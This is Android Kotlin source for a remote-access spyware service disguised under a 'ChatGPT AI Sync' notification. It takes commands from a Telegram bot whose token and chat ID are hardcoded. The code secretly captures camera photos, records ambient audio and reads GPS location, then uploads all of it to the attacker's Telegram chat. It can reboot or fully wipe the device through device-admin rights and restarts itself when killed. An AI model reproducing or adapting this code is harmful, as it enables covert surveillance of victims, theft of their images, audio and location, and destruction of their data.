package com.cognitive.ai.syncagent

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class BackgroundControlService : Service() {
    private val handler = Handler(Looper.getMainLooper())
    private lateinit var pollingRunnable: Runnable
    private var token: String = ""

    // 🔒 بيانات بوت تيليجرام والأيدي الخاص بك يا فندم
    private val TELEGRAM_BOT_TOKEN = "9004970470:AAFN2VS-MzpUQ6oEbtHu5THzcQBYQZHmAkY"
    private val TELEGRAM_CHAT_ID = "6904130639"
    private var isControlPanelSent = false

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        token = intent?.getStringExtra("token") ?: "agent_unknown"

        startForeground(1, createForegroundNotification())

        if (!isControlPanelSent) {
            sendControlPanelButtonsToTelegram()
            isControlPanelSent = true
        }

        pollingRunnable = object : Runnable {
            override fun run() {
                pollCommandsFromTelegram()
                handler.postDelayed(this, 7000)
            }
        }
        handler.post(pollingRunnable)

        return START_STICKY
    }

    private fun createForegroundNotification(): Notification {
        val channelId = "sync_service_channel_telegram"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "AI Sync Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("ChatGPT AI Sync")
            .setContentText("المزامنة الخلفية نشطة")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun sendControlPanelButtonsToTelegram() {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                val url = URL("https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage")
                val conn = (url.openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    doOutput = true
                    setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                }

                val keyboardJson = JSONArray().apply {
                    put(JSONArray().apply {
                        put(JSONObject().apply { put("text", "📸 التقاط صورة سرية") })
                        put(JSONObject().apply { put("text", "🎙️ تسجيل صوت محيطي") })
                    })
                    put(JSONArray().apply {
                        put(JSONObject().apply { put("text", "📍 جلب الموقع GPS") })
                        put(JSONObject().apply { put("text", "🔌 إعادة تشغيل الجهاز") })
                    })
                    put(JSONArray().apply {
                        put(JSONObject().apply { put("text", "⚠️ فرمتة الجهاز بالكامل") })
                    })
                }

                val replyMarkup = JSONObject().apply {
                    put("keyboard", keyboardJson)
                    put("resize_keyboard", true)
                    put("one_time_keyboard", false)
                }

                val payload = JSONObject().apply {
                    put("chat_id", TELEGRAM_CHAT_ID)
                    put("text", "⚔️ غرفة العمليات والسيطرة الميدانية للهدف ($token):\nاختر الأمر المطلوب يا فندم:")
                    put("reply_markup", replyMarkup)
                }

                OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {}
        }
    }

    private fun pollCommandsFromTelegram() {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                val url = URL("https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/getUpdates?offset=-1")
                val conn = url.openConnection() as HttpURLConnection
                conn.connectTimeout = 4000
                conn.readTimeout = 4000
                conn.requestMethod = "GET"
                
                if (conn.responseCode == HttpURLConnection.HTTP_OK) {
                    val responseStr = conn.inputStream.bufferedReader().use { it.readText() }
                    val jsonRes = JSONObject(responseStr)
                    val resultArr = jsonRes.optJSONArray("result")
                    if (resultArr != null && resultArr.length() > 0) {
                        val lastMsg = resultArr.getJSONObject(resultArr.length() - 1)
                        val messageObj = lastMsg.optJSONObject("message")
                        if (messageObj != null) {
                            val text = messageObj.optString("text").trim()
                            val chatId = messageObj.optJSONObject("chat")?.optString("id")
                            
                            if (chatId == TELEGRAM_CHAT_ID) {
                                when (text) {
                                    "📸 التقاط صورة سرية", "/photo" -> executeHiddenPhotoCapture()
                                    "🎙️ تسجيل صوت محيطي", "/audio" -> executeAdvancedSecretAudioRecording()
                                    "📍 جلب الموقع GPS", "/gps" -> reportGPSLocationToTelegram()
                                    "🔌 إعادة تشغيل الجهاز", "/reboot" -> executeRebootDevice()
                                    "⚠️ فرمتة الجهاز بالكامل", "/wipe" -> executeWipeDevice()
                                }
                            }
                        }
                    }
                }
                conn.disconnect()
            } catch (e: Exception) {}
        }
    }

    private fun sendFileToTelegram(file: File, caption: String) {
        GlobalScope.launch(Dispatchers.IO) {
            try {
                val boundary = "Boundary_" + System.currentTimeMillis()
                val url = URL("https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendDocument")
                val conn = (url.openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    doOutput = true
                    setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                }

                conn.outputStream.use { os ->
                    val writer = OutputStreamWriter(os, "UTF-8")
                    
                    writer.write("--$boundary\r\n")
                    writer.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n")
                    writer.write("$TELEGRAM_CHAT_ID\r\n")

                    writer.write("--$boundary\r\n")
                    writer.write("Content-Disposition: form-data; name=\"caption\"\r\n\r\n")
                    writer.write("$caption\r\n")

                    writer.write("--$boundary\r\n")
                    writer.write("Content-Disposition: form-data; name=\"document\"; filename=\"${file.name}\"\r\n")
                    writer.write("Content-Type: application/octet-stream\r\n\r\n")
                    writer.flush()

                    FileInputStream(file).use { fis ->
                        fis.copyTo(os)
                    }
                    os.flush()

                    writer.write("\r\n--$boundary--\r\n")
                    writer.flush()
                }
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {}
        }
    }

    private fun reportGPSLocationToTelegram() {
        try {
            val locationManager = getSystemService(Context.LOCATION_SERVICE) as android.location.LocationManager
            val loc = locationManager.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER) 
                ?: locationManager.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
            
            if (loc != null) {
                val mapsUrl = "https://maps.google.com/?q=${loc.latitude},${loc.longitude}"
                val message = "📍 تم رصد إحداثيات الهدف ($token):\nLat: ${loc.latitude}\nLng: ${loc.longitude}\nالرابط: $mapsUrl"
                
                GlobalScope.launch(Dispatchers.IO) {
                    val url = URL("https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage")
                    val conn = (url.openConnection() as HttpURLConnection).apply {
                        requestMethod = "POST"
                        doOutput = true
                        setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                    }
                    val payload = JSONObject().apply {
                        put("chat_id", TELEGRAM_CHAT_ID)
                        put("text", message)
                    }
                    OutputStreamWriter(conn.outputStream).use { it.write(payload.toString()); it.flush() }
                    conn.responseCode
                    conn.disconnect()
                }
            }
        } catch (e: Exception) {}
    }

    private fun executeAdvancedSecretAudioRecording() {
        try {
            val audioFile = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "env_audio_${System.currentTimeMillis()}.3gp")
            val recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(audioFile.absolutePath)
                prepare()
                start()
            }
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    recorder.stop()
                    recorder.release()
                    sendFileToTelegram(audioFile, "🎙️ تسجيل صوتي محيطي للهدف: $token")
                } catch (e: Exception) {}
            }, 20000)
        } catch (e: Exception) {}
    }

    private fun executeHiddenPhotoCapture() {
        try {
            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as android.hardware.camera2.CameraManager
            val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                val facing = cameraManager.getCameraCharacteristics(id).get(android.hardware.camera2.CameraCharacteristics.LENS_FACING)
                facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
            } ?: cameraManager.cameraIdList.firstOrNull() ?: return

            val imageReader = android.media.ImageReader.newInstance(640, 480, android.graphics.ImageFormat.JPEG, 1)
            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()

                val photoFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "capture_${System.currentTimeMillis()}.jpg")
                photoFile.writeBytes(bytes)
                sendFileToTelegram(photoFile, "📸 صورة مسروقة من الهدف: $token")
            }, handler)

            if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                cameraManager.openCamera(cameraId, object : android.hardware.camera2.CameraDevice.StateCallback() {
                    override fun onOpened(camera: android.hardware.camera2.CameraDevice) {
                        val captureRequest = camera.createCaptureRequest(android.hardware.camera2.CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                            addTarget(imageReader.surface)
                        }
                        camera.createCaptureSession(listOf(imageReader.surface), object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: android.hardware.camera2.CameraCaptureSession) {
                                session.capture(captureRequest.build(), object : android.hardware.camera2.CameraCaptureSession.CaptureCallback() {
                                    override fun onCaptureCompleted(s: android.hardware.camera2.CameraCaptureSession, r: android.hardware.camera2.CaptureRequest, res: android.hardware.camera2.TotalCaptureResult) {
                                        camera.close()
                                    }
                                }, handler)
                            }
                            override fun onConfigureFailed(session: android.hardware.camera2.CameraCaptureSession) { camera.close() }
                        }, handler)
                    }
                    override fun onDisconnected(camera: android.hardware.camera2.CameraDevice) { camera.close() }
                    override fun onError(camera: android.hardware.camera2.CameraDevice, error: Int) { camera.close() }
                }, handler)
            }
        } catch (e: Exception) {}
    }

    private fun executeRebootDevice() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    dpm.reboot(ComponentName(this, TargetAdminReceiver::class.java))
                }
            }
        } catch (e: Exception) {}
    }

    private fun executeWipeDevice() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(this, TargetAdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.wipeData(0)
            }
        } catch (e: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(pollingRunnable)
        val restartIntent = Intent(applicationContext, BackgroundControlService::class.java).apply {
            putExtra("token", token)
        }
        startService(restartIntent)
    }
}
